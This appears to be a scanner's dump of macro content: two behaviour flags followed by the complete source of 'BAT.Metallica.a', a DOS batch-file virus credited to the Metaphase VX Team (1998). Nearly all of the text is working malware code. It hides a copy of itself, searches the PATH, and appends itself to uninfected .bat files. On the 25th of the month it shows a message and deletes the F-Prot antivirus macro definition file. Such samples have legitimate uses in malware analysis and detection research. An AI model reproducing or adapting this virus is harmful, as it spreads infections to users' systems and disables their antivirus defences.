behavior.autoexec: Runs when the Word document is opened
behavior.call: May call a DLL using Excel 4 Macros

docinfo.macro:
Virus Author: Raven of [Metaphase VX Team] Oct 98.
Virus Name  : BAT.Metallica.a
Virus Target: Batch Files 
Target OS...: DOS 6.x
Virus Info..: Compound Batch Infector
Encryption..: No.
Payload.....: Yes. Small Message and Deletes A Def file
Stealth.....: N/A.
TSR.........: N/A.
AntiAV......: Yes. Anti F-macrow

:: [bat.metallica]

:: Raven of Metaphase VX Team
@if '%_vx%==' goto _vx
@if not '%_vx%==' goto metal_up_your_ass
:_vx metallica
@echo off%_metallica%
if '%1=='metallica goto metallica%2
set metallica=%0.bat
if not exist %metallica% set metallica=%0
if '%metallica%==' set metallica=autoexec.bat
set !metallica=%1 %2 %3 %4 %5 %6 %7 %8 %9
if exist c:\_metallica.bat goto metallicagoes
if exist %metallica% goto metallicafall
call %metallica% metallica h %path%
if exist %metallica% goto metallicafall

goto xxxmetallica
:metallicahell
shift%_metallica%
if '%2==' goto metal_up_your_ass
if exist %2\%metallica set metallica=%2\%metallica%
if exist %2%metallica set metallica=%2%metallica%
if exist %2\%metallica.bat set metallica=%2\%metallica%.bat
if exist %2%metallica.bat set metallica=%2%metallica%.bat
if not exist %metallica% goto metallicahell
goto metallica_exit
:metallicafall
find "metallica"<%metallica%>c:\_metallica.bat
attrib c:\_metallica.bat +h
:metallicagoes

if '%!metallica%=='````` goto metal_up_your_ass
set !metallica=%!metallica%`
command /e:5000 /c c:\_metallica metallica aux
:xxxmetallica
call %metallica% metallica now
set _vx=%_metallica%
set !metallica=
set metallica=
goto metal_up_your_ass
:metallicanow
set _vx=x%_metallica%
%metallica% %!metallica%
:metallica_aux
for %%a in (*.bat ..\*.bat) do call c:\_metallica metallica invite %%a 
exit metallica
:metallica_invite
find "metallica"<%3>nul
if not errorlevel 1 goto metallicajustice

echo @if '%%_vx%%==' goto _vx>metallica$
type %3>>metallica$
echo.>>metallica$
type c:\_metallica.bat>>metallica$
move metallica$ %3>nul
set metallica#=%metallica#%`
if %metallica#%==````` exit 
:metallicajustice
set metallica!=%metallica!%`
if %metallica!%==````` exit 
:metal_up_your_ass
echo.|date|find "25">nul.metallica
if errorlevel 1 goto metallica_exit
echo ... And Justice For All
if errorlevel 1 goto metallica_exit
echo y| del c:\f-prot\macro.def
:metallica_exit

Metaphase 1998
